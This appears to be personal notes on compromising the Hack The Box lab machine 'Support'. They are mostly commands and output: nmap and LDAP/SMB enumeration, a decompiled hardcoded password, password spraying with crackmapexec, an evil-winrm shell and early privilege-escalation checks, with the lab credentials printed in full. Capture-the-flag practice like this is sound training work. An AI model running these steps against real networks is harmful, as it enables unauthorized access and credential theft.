# Support

## Attack vectors
SMB 3.1.1
    CVE-2020-0796

LDAP 2
    https://security.snyk.io/vuln/SNYK-PYTHON-LDAP3-42044

## Nmap
```
$ nmap -A -Pn 10.10.11.174                                                   tom@tom
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-06 13:21 CEST
Nmap scan report for support.htb (10.10.11.174)
Host is up (0.023s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-06 11:21:21Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-10-06T11:21:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.73 seconds
```

```
$ sudo nmap --script broadcast-dhcp6-discover support.htb                            tom@tom
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-06 13:29 CEST
Nmap scan report for support.htb (10.10.11.174)
Host is up (0.022s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 4.98 seconds
```

```
$ sudo nmap -sU -sS 10.10.11.174                                                                       1 ↵ tom@tom
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-06 13:19 CEST
Nmap scan report for support.htb (10.10.11.174)
Host is up (0.027s latency).
Not shown: 997 open|filtered udp ports (no-response), 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
53/udp   open  domain
123/udp  open  ntp
389/udp  open  ldap

Nmap done: 1 IP address (1 host up) scanned in 1587.43 seconds
```

## LDAP search
```
$ ldapsearch -LLL -x -H ldap://support.htb -b '' -s base'(object=*)'
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=support,DC=htb
ldapServiceName: support.htb:dc$@SUPPORT.HTB
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=support,DC=htb
serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat
 ion,DC=support,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=support,DC=htb
namingContexts: DC=support,DC=htb
namingContexts: CN=Configuration,DC=support,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=support,DC=htb
namingContexts: DC=DomainDnsZones,DC=support,DC=htb
namingContexts: DC=ForestDnsZones,DC=support,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 84026
dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=support,DC=htb
dnsHostName: dc.support.htb
defaultNamingContext: DC=support,DC=htb
currentTime: 20221006114437.0Z
configurationNamingContext: CN=Configuration,DC=support,DC=htb
```

```
msf6 auxiliary(scanner/smb/pipe_auditor) > run
[+] 10.10.11.174:445      - Pipes: \netlogon, \lsarpc, \samr
[*] support.htb:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## SMB client
```
$ smbclient -L support.htb                                                                                                                                                                                                         tom@tom
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\tom]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```

```
$ smbclient \\\\support.htb\\support-tools
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\tom]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 19:01:06 2022
  ..                                  D        0  Sat May 28 13:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022
  putty.exe                           A  1273576  Sat May 28 13:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022

		4026367 blocks of size 4096. 857752 blocks available
```

## Decomilation
Use ILSpy
Password obfuscation function
Output when put in new project:

User: 
Pass: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

## Query LDAP with password
```
$ ldapsearch -D Support\\ldap -H ldap://support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'  -b 'CN=Users,DC=support,DC=htb' | grep 'name: '        tom@tom
name: Users
name: krbtgt
name: Domain Computers
name: Domain Controllers
name: Schema Admins
name: Enterprise Admins
name: Cert Publishers
name: Domain Admins
name: Domain Users
name: Domain Guests
name: Group Policy Creator Owners
name: RAS and IAS Servers
name: Allowed RODC Password Replication Group
name: Denied RODC Password Replication Group
name: Read-only Domain Controllers
name: Enterprise Read-only Domain Controllers
name: Cloneable Domain Controllers
name: Protected Users
name: Key Admins
name: Enterprise Key Admins
name: DnsAdmins
name: DnsUpdateProxy
name: Shared Support Accounts
name: ldap
name: support
name: smith.rosario
name: hernandez.stanley
name: wilson.shelby
name: anderson.damian
name: thomas.raphael
name: levine.leopoldo
name: raven.clifton
name: bardot.mary
name: cromwell.gerard
name: monroe.david
name: west.laura
name: langley.lucy
name: daughtler.mabel
name: stoll.rachelle
name: ford.victoria
name: Administrator
name: Guest
```

```
$ ldapsearch -D support\\ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -H ldap://support.htb -b 'CN=Users,DC=support,DC=htb' | grep info:                                             tom@tom
info: Ironside47pleasure40Watchful
```

```
$ ldapdomaindump support.htb -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -u 'support\ldap'
```

## Password spraying
```
$ cme smb support.htb -u users.txt -p /opt/wordlists/rockyou.txt                                                                                                                    tom@tom
SMB         support.htb     445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         support.htb     445    DC               [+] support.htb\Users:C
```

```
$ cme smb support.htb -u users.txt -p ./passwords.txt                                                                                                                               tom@tom
SMB         support.htb     445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         support.htb     445    DC               [+] support.htb\Users:Ironside47pleasure40Watchful
```

```
$ cme winrm support.htb -u users.txt -p ./passwords.txt                                                                                                                             tom@tom
SMB         support.htb     5985   DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:support.htb)
HTTP        support.htb     5985   DC               [*] http://support.htb:5985/wsman
WINRM       support.htb     5985   DC               [-] support.htb\Users:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\krbtgt:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Domain Computers:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Domain Controllers:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Schema Admins:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Enterprise Admins:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Cert Publishers:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Domain Admins:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Domain Users:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Domain Guests:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Group Policy Creator Owners:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\RAS and IAS Servers:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Allowed RODC Password Replication Group:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Denied RODC Password Replication Group:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Read-only Domain Controllers:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Enterprise Read-only Domain Controllers:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Cloneable Domain Controllers:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Protected Users:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Key Admins:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Enterprise Key Admins:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\DnsAdmins:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\DnsUpdateProxy:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\Shared Support Accounts:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [-] support.htb\ldap:Ironside47pleasure40Watchful
WINRM       support.htb     5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

## User access
```
$ evil-winrm -i support.htb -u 'support' -p 'Ironside47pleasure40Watchful'                                                                                          1 ↵ tom@tom

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents>
```

## User flag
```
*Evil-WinRM* PS C:\Users\support\Desktop> cat user.txt
add400480328d412c0671722c166b9d0
```

## Priv esc
```bash
*Evil-WinRM* PS C:\Users\support\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
```bash
*Evil-WinRM* PS C:\Users\support\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```
```bash
*Evil-WinRM* PS C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup> cat desktop.ini

[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
```
